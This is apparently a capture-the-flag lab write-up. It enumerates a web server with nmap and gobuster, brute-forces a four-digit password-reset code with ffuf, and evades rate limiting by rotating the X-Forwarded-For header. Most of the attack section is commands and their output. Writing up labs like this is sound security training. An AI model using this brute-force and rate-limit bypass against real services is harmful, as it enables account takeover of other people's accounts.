# Enumeration
First let's make an nmap scan
```bash
root$ nmap -sV -p80-10000 -sC 10.10.230.5
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-13 06:52 GMT
Nmap scan report for 10.10.230.5
Host is up (0.0017s latency).
Not shown: 9920 closed ports
PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
MAC Address: 02:52:C5:DB:61:59 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.61 seconds

```
Here we can see that the port 1337 run an http server.

This page contain a login form:
![[Pasted image 20250113075511.png]]
## Explore the code
![[Pasted image 20250113082047.png]]
You can see in the code source that the developper let a note that speak about the directory name convention.
## Directory Enumeration 
### Create the wordlist
Lets create a wordlist that respect the convention:
```bash
root$ sed 's/^/hmr_/' /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > hmr_wordlist.txt
```
### Enumerating directory
```bash
root$ gobuster dir -u http://10.10.230.5:1337/ -w hrm_wordlist.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.5:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                hmr_wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hmr_images           (Status: 301) [Size: 322] [--> http://10.10.230.5:1337/hmr_images/]
/hmr_css              (Status: 301) [Size: 319] [--> http://10.10.230.5:1337/hmr_css/]
/hmr_js               (Status: 301) [Size: 318] [--> http://10.10.230.5:1337/hmr_js/]
/hmr_logs             (Status: 301) [Size: 320] [--> http://10.10.230.5:1337/hmr_logs/]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```
We can see that we found:
- images/
- css/
- js/
- logs/
## Logs.txt
We can see in the file: http://<IP\>:1337/hmr_logs/error.logs
![[Pasted image 20250113082922.png]]
# Bypass Auth
## Reset the password
You can see that when you put a valid email, you are redirected to this page:
![[Pasted image 20250113083437.png]]
### HTTP
Here is the request:
```http
POST /reset_password.php HTTP/1.1
Host: <IP>:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://10.10.230.5:1337
Connection: keep-alive
Referer: http://<IP>:1337/reset_password.php
Cookie: PHPSESSID=q03l66rhl147291hobsvn2mkhd
Upgrade-Insecure-Requests: 1
Priority: u=0, i

recovery_code=1002&s=70
```
The variable `recovery_code` contain the code that we have to bruteforce
#### Bruteforce
First, we have to create the file with all the value:
```bash
$ seq 0000 9999 >> brutefile.txt
```

Then we can use the burp suite intruder to bruteforce it. See [[Basic_token#Bruteforce]]

We can see that we have a rate limite (8)
![[Pasted image 20250113115152.png]]
##### Rate-limit bypass
In this lab, when you change the value of the `X-Forwarded-For` your rate-limit-pending is reset to 9.
![[Pasted image 20250113120700.png]]
#### Fuff
Then we can create a fuff bruteforce request:
```bash
ffuf -w brutefile.txt \
-u "http://<IP>:1337/reset_password.php" \
-X "POST" \
-d "recovery_code=FUZZ&s=60" \
-H "Cookie: PHPSESSID=<PHP_SESSIONID>" \
-H "X-Forwarded-For: FUZZ" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fr "Invalid" \
-s
```

### Flag 1
Finally you can find the flag
![[Pasted image 20250113151930.png]]
# Keep connection
Here is the fonction that disconnect you if you don't have a persistentSession cookie set to yes:
```js
<script>
function getCookie(name) {|
	const value = `; ${document.cookie}`;|
	const parts = value.split(`; ${name}=`);|
	if (parts.length === 2) return parts.pop().split(';').shift();|
}

function checkTrailUserCookie() {|
	const trailUser = getCookie('persistentSession');|
	if (!trailUser) {|

	window.location.href = 'logout.php';|
}
setInterval(checkTrailUserCookie, 1000);|
```
So you have to set your cookie to yes
![[Pasted image 20250113152233.png]]
FF